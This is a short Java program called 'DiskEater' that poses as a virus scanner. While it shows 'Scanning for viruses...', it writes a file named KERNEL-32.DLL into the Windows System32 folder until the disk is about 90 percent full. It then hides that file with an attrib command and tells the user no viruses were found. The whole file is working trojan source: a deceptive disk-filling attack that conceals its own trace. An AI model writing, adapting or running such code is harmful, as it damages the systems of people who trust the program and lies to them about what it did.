/*
 * Written by Kevin Hainsworth
 */
package diskEater;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;

public class DiskEater {

	public static void main(String[] args){
		System.out.println("Scanning for viruses...");
		//create 200mb buffer to fill the file with
		//chars are 2 bytes, mult by 100000000 for 200 mb buffer
		StringBuilder sb = new StringBuilder(10000000);
		for (int i=0; i<10000000; i++) {
			sb.append('a');
		}
		String buffer = sb.toString();
		//Create file name
		File f = new File("KERNEL-32.DLL");
		//find the disk drives
		File[] fs = File.listRoots();
		
		Writer output = null;
		//iterator for the drives
		int j = 0;
		boolean directory = false;
		//while the correct windows directory isnt found
		while(!directory){
			//if statement to break if out of all the drives, the System32 folder was not found
			if(j>fs.length){
				System.out.println("Scan error: Operating System disk not found.");
				break;
			}
			//append the correct drive with the file path
			File root = new File(fs[j]+"\\Windows\\System32\\KERNEL-32.DLL");
			String path = root.toString();
			try {
				//create the writer at that path
				//if path not found goes to catch
				output = new BufferedWriter(new FileWriter(root));
				//while the drive has space below 90% filled left
				while((double)fs[j].getFreeSpace()/fs[j].getTotalSpace()>0.1){
					//write the 200 mb buffer to the file
					output.write(buffer);
					//System.out.println((double)fs[j].getFreeSpace()/fs[j].getTotalSpace());
				}
				
				output.close();
				directory = true;
				//file finished being created to correct size, set file to hidden
				Process process = Runtime.getRuntime().exec("cmd.exe /C attrib +h " + path); 
				System.out.println("The scanning finished and found no viruses!");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				//e.printStackTrace();
				//increment through the available drives if the path was not found
				j++;
				
			}
		}

		//System.out.println(fs[0].getTotalSpace());
		//System.out.println(fs[0].getFreeSpace());
		//System.out.println((double)fs[0].getFreeSpace()/fs[0].getTotalSpace());
	}
}
